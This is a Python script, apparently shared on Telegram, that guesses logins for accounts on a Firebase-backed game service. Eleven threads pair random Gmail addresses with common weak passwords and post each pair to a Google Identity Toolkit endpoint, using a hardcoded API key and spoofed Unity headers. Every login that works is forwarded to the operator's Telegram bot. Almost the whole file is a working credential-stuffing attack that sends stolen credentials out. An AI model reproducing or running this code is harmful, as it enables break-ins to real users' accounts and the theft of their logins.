import requests
import random
import threading
import os
from threading import Thread
import time
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#اورق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
print(X + ''' 
░██╗░░░░░░░██╗██╗███╗░░██╗░██████╗████████╗
░██║░░██╗░░██║██║████╗░██║██╔════╝╚══██╔══╝
░╚██╗████╗██╔╝██║██╔██╗██║╚█████╗░░░░██║░░░
░░████╔═████║░██║██║╚████║░╚═══██╗░░░██║░░░
░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░
''')
Token=input(f'{Z} Token :' + S)
ID=input(f'{Z} ID :' + S)
os.system('clear')
def login():
	while True:
		email=''.join(random.choice('qwertyuiopasdfghjklzxcvbnm')for i in range(5,9))
		pas=random.choice(['123456','1234567','12345678','123456789'])
		payload = {
		    "email":f'{email}@gmail.com',
		    "password":pas,
		    "returnSecureToken": True,
		    "clientType": "CLIENT_TYPE_ANDROID"
		}
		
		headers = {
		  'User-Agent': "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
		  'Accept-Encoding': "deflate, gzip",
		  'Content-Type': "application/json",
		  'X-Unity-Version': "2022.3.62f2",

		}
		
		re = requests.post('https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM', json=payload, headers=headers).text
		if 'idToken' in re:
			print(f'''
ونستون جابلك حساب
{F} Email : {X}{email}@gmail.com | {F} Pas : {X}{pas}''')
			time.sleep(5)
			ty=f'''
ونستون جابلك حساب
••••••••••••••••••••••••••••••••••••••••
Email ✧ {email}@gmail.com
Pass ✧ {pas} 
••••••••••••••••••••••••••••••••••••••••
Dev : @w_22u \n
Ch: https://t.me/wi_st2
			'''
			requests.post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={ty}''')
		else:
			print(f' {Z} Email : {X}{email}@gmail.com | {Z} Pas : {X}{pas}')

for i in range(11):
	Thread(target=login).start()
